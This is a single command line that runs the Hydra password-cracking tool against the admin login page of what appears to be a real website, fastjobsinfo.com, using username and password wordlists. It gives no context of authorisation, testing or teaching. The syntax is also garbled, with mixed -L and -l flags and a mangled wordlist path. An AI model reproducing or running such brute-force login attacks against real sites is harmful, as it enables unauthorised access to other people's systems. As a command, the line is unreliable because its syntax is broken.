hydra https://www.fastjobsinfo.com/admin/login.php?id=1 -L /root/userlist.txt -p /rootwordlist.txt -V -l http-get /hackme
